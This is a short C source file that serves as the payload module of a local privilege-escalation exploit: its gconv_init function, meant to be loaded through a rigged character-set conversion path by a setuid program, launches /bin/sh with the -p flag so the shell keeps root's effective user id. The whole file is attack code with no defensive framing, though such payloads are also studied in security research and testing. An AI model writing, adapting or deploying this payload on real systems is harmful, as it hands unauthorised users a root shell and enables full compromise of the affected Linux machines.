#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int gconv_init (void *_)
{
    // -p priv  Do not attempt to reset effective uid if it does not match uid. This is not set by
    //          default to help avoid incorrect usage by setuid root programs via system(3) or
    //          popen(3).
    char *argv[] = {"/bin/sh", "-p", NULL};
    puts("[*] Run arbitrary shared library");
    setenv("PATH", "/bin:/usr/bin", 1);
    execve("/bin/sh", argv, NULL);
}

void gconv_end (void *data)
{
}

int gconv (void)
{
    return 0;
}
